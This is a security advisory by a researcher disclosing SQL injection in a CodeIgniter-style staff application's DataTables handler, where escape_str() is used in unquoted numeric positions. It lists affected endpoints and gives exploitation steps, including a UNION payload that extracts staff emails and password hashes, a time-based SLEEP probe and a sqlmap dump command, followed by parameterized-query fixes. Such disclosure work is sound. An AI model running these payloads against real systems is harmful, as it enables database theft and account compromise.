# VULN-03 — SQL Injection in DataTables via Unquoted `escape_str()` (DB Compromise)

| | |
|---|---|
| **Researcher** | tal7aouy |
| **Severity** | High (CVSS 3.1: 8.8 — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H) |
| **CWE** | CWE-89: SQL Injection |
| **Authentication** | Authenticated staff with the relevant module `view` permission |
| **Core sink** | `application/helpers/datatables_helper.php:214-262` |

---

## 1. Summary

The generic DataTables server-side handler concatenates request parameters into a raw SQL string. Several table definitions pass user input through `db->escape_str()` in **unquoted numeric context**. `escape_str()` only escapes quotes/backslashes and adds **no quoting**, so in an unquoted position it provides *zero* protection. A low-privilege staff member can inject arbitrary SQL and dump the entire database (password hashes, API keys, all tenants).

## 2. Root cause

`escape_str()` semantics (CodeIgniter `mysqli` driver):

```php
protected function _escape_str($str) { return $this->conn_id->real_escape_string($str); }
```

`real_escape_string` escapes `' " \ NUL \n \r Ctrl-Z` — it does **not** wrap the value in quotes. In quoted context (`x="..."`) it is safe; in **unquoted numeric context** (`x=...`) it is useless, because no quote is needed to break out.

The DataTables engine interpolates the `$where` array **raw** (no query builder / no bound params):

```php
// datatables_helper.php
$where  = implode(' ', $where);
$sQuery = " SELECT SQL_CALC_FOUND_ROWS ... FROM $sTable $join $sWhere $where $sGroupBy $sOrder $sLimit ";
$rResult = $CI->db->query($sQuery)->result_array();
```

Proof the escaping is bypassed (an unquoted payload survives `real_escape_string`):

```
input : 0 UNION SELECT username,password,3,4 FROM tblstaff-- -
after : 0 UNION SELECT username,password,3,4 FROM tblstaff-- -   (unchanged — no quotes to escape)
query : ... AND project_id=0 UNION SELECT username,password,3,4 FROM tblstaff-- -
```

## 3. Confirmed injectable endpoints

| Table view | Parameter | Method | Controller endpoint |
|---|---|---|---|
| `views/admin/tables/subscriptions.php:22,26` | `project_id`, `client_id` | GET | `admin/subscriptions/table` |
| `views/admin/tables/tickets.php:65` | `project_id` | POST | `admin/tickets/table` |
| `views/admin/tables/estimate_request.php:39,47` | `assigned`, `status[]` | POST | `admin/estimate_request/table` |
| `views/admin/tables/staff_projects.php:16` | `staff_id` | POST | dashboard/staff table |
| `views/admin/tables/all_contacts.php:44` | `custom_view` | POST | `admin/clients/all_contacts` |

The anti-pattern (`escape_str()` outside a quoted literal) occurs at ~80 sites across models/helpers — see the repo root README and the main report appendix.

## 4. Exploitation

CSRF is disabled by default, so each is a single request.

### 4.1 Error/UNION-based (GET example)
```
GET /admin/subscriptions/table?project_id=0 UNION SELECT 1,concat(email,0x3a,password),3,4,5 FROM tblstaff-- -
```
The extra rows surface in the JSON DataTables response.

### 4.2 Time-based blind
```
GET /admin/subscriptions/table?project_id=(SELECT SLEEP(5))
```
A 5-second delay confirms injection; automate with sqlmap:

```bash
sqlmap -u "https://target/admin/subscriptions/table?project_id=1" \
       --cookie="<staff session cookie>" -p project_id --dbms mysql --dump -T tblstaff
```

## 5. Impact

Full database read (and, with sufficient DB grants, write) — password hashes, API keys, financial and customer data — reachable by the lowest-privilege staff account.

## 6. Remediation

Per-site: cast numeric parameters to `int`. Systemic: replace the raw `$where` string with parameterized `$this->db->where($field, $value)` and audit every `escape_str(` not inside a quoted literal. See `patch.diff`.

```php
// before (injectable)
array_push($where, 'AND project_id=' . $this->ci->db->escape_str($this->ci->input->get('project_id')));
// after (safe)
array_push($where, 'AND project_id=' . (int) $this->ci->input->get('project_id'));

// arrays:
array_push($where, 'AND status IN (' . implode(',', array_map('intval', (array) $this->ci->input->post('status'))) . ')');
```

## 7. References

- CWE-89: https://cwe.mitre.org/data/definitions/89.html

— tal7aouy
